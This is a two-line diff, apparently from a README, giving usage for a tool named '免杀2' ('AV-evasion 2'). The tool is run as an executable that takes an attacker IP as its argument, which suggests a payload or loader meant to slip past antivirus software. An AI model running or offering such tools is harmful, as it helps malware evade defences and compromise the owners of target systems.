@@ -1,0 +1,2 @@
+免杀2使用：
+免杀2.exe ip_of_attack
